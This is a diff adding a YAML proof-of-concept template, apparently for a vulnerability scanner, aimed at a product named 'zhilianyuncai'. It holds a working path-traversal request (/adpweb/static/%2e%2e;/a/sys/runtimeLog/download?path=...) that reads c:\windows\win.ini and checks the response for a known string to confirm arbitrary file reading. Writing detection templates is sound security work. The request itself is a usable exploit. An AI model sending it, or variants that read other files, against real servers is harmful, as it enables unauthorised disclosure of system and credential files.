@@ -1,0 +1,19 @@
+name: poc-yaml-zhilianyuncai-runtimeLog_download-File-reading
+transport: http
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+    expression: response.status == 200 && response.body.bcontains(b'; for 16-bit app support')
+
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486585&idx=1&sn=cb0e73248e17310c50f333948569d15f&chksm=c267b94af510305cc7e8dd1d7aec83c435800f097bfc39c0c87b7b1ebb5dfe79cadaaea4bb14&token=1628549949&lang=zh_CN#rd
+
